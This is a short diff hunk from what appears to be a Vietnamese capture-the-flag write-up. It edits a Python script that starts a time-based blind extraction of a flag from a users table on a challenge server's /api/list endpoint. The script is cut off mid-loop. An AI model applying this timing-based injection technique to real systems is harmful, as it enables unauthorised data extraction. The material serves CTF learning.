@@ -11,11 +11,12 @@ flag được để trong __tables users__ ở dòng mà username là __flaghold
 
 ta viết code để khai khác lấy flag
 
-```url = 'http://188.166.173.208:30042/api/list'
-
+```
 import requests, string, time
 arr = "_}"+ string.digits+ string.ascii_letters  + string.punctuation
 s = requests.session()
+url = 'http://188.166.173.208:30042/api/list'
+
 def bind(step):
     for char in arr:
         a = time.time()
